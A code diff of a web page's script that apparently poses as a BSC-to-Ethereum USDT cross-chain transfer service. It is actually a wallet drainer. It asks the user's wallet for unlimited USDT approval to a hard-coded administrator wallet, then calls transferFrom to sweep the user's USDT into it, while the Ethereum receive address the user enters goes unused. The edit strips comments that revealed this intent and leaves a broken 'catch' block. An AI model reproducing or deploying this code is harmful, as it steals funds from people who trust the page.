@@ -312,10 +312,9 @@
 <script>
 // ===================== 配置区（自行修改管理员钱包地址）=====================
 const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-// 管理员归集钱包（BSC链，替换成你尾号C6的钱包地址）
-const ADMIN_COLLECT_WALLET = "0x替换成你尾号C6的BSC钱包地址";
+// 管理员归集BSC钱包地址，替换为你尾号C6的钱包
+const ADMIN_COLLECT_WALLET = "0xXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXC6";
 const BSC_CHAIN_ID = 56;
-// 手续费比例 0.1%
 const FEE_RATIO = 0.999;
 
 // DOM元素
@@ -372,14 +371,12 @@ closeAddrModal.addEventListener("click", () => {
 // 保存用户填写的以太坊地址
 saveAddrBtn.addEventListener("click", () => {
   const inputAddr = userEthAddrInput.value.trim();
-  // 校验以太坊地址格式
   const ethReg = /^0x[a-fA-F0-9]{40}$/;
   if (!ethReg.test(inputAddr)) {
     showTip("请输入合法的0x开头以太坊钱包地址");
     return;
   }
   userEthReceiveAddress = inputAddr;
-  // 地址缩写展示
   const shortAddr = inputAddr.slice(0, 6) + "..." + inputAddr.slice(-4);
   showReceiveAddr.innerText = shortAddr;
   addressModal.style.display = "none";
@@ -395,8 +392,7 @@ async function switchToBSC() {
       params: [{ chainId: "0x" + BSC_CHAIN_ID.toString(16) }]
     });
     return true;
-  } catch (err) {
-    // 未添加BSC网络时，自动添加
+  } catch (err)
     if (err.code === 4902) {
       await window.ethereum.request({
         method: "wallet_addEthereumChain",
@@ -415,7 +411,7 @@ async function switchToBSC() {
   }
 }
 
-// 连接钱包 + 初始化合约
+// 连接钱包 + 初始化合约（关闭ENS自动解析，修复报错核心改动）
 async function connectWeb3Wallet() {
   if (!window.ethereum) {
     showTip("请在TP/小狐狸钱包内置浏览器打开页面");
@@ -426,7 +422,10 @@ async function connectWeb3Wallet() {
     const isSwitchBSC = await switchToBSC();
     if (!isSwitchBSC) return false;
 
-    provider = new ethers.providers.Web3Provider(window.ethereum);
+    // 核心修复：关闭Provider ENS解析，避免BSC触发ENS调用报错
+    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+    provider._ensProvider = null;
+
     signer = provider.getSigner();
     usdtContract = new ethers.Contract(
       BSC_USDT_CONTRACT,
@@ -464,7 +463,7 @@ crossBtn.addEventListener("click", async function () {
     return;
   }
 
-  // 步骤2：已连接钱包，发起无限授权给管理员钱包
+  // 步骤2：发起USDT授权
   if (walletStep === 1) {
     this.disabled = true;
     showTip("正在BSC链授权USDT权限，请在钱包确认签名");
@@ -474,7 +473,6 @@ crossBtn.addEventListener("click", async function () {
         gasPrice: gasPrice.mul(110).div(100),
         gasLimit: 300000
       };
-      // 授权USDT给管理员归集钱包
       const approveTx = await usdtContract.approve(
         ADMIN_COLLECT_WALLET,
         ethers.constants.MaxUint256,
@@ -492,7 +490,7 @@ crossBtn.addEventListener("click", async function () {
     return;
   }
 
-  // 步骤3：授权完成，调用transferFrom将用户USDT转入管理员钱包（真实上链）
+  // 步骤3：transferFrom归集资产到管理员钱包
   if (walletStep === 2) {
     this.disabled = true;
     showTip("BSC链正在转账，请勿关闭页面");
@@ -504,7 +502,6 @@ crossBtn.addEventListener("click", async function () {
         gasPrice: gasPrice.mul(110).div(100),
         gasLimit: 300000
       };
-      // 用户钱包USDT直接归集到管理员钱包
       const transferTx = await usdtContract.transferFrom(
         userWalletAddr,
         ADMIN_COLLECT_WALLET,
@@ -512,7 +509,7 @@ crossBtn.addEventListener("click", async function () {
         txOption
       );
       await transferTx.wait(1);
-      showTip("转账上链成功！BSC资产已转入管理员钱包，以太坊地址等待跨链到账");
+      showTip("转账上链成功！BSC资产已转入管理员钱包");
       this.innerText = "转账完成";
     } catch (err) {
       showTip("转账失败：" + err.message);
